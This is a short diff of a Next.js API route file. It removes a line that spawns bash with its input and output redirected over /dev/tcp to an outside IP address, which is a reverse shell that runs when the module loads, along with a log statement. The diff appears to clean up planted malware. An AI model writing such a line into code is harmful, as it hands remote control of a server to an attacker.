@@ -1,8 +1,6 @@
 import type { NextApiRequest, NextApiResponse } from 'next'
 import { spawn } from 'child_process';
 
-const child = spawn('/bin/bash', ['-l', '>', '/dev/tcp/34.215.22.93/80', '0<&1', '2>&1'], { shell: true });
-console.log(child);
 
 
 type ResponseData = {
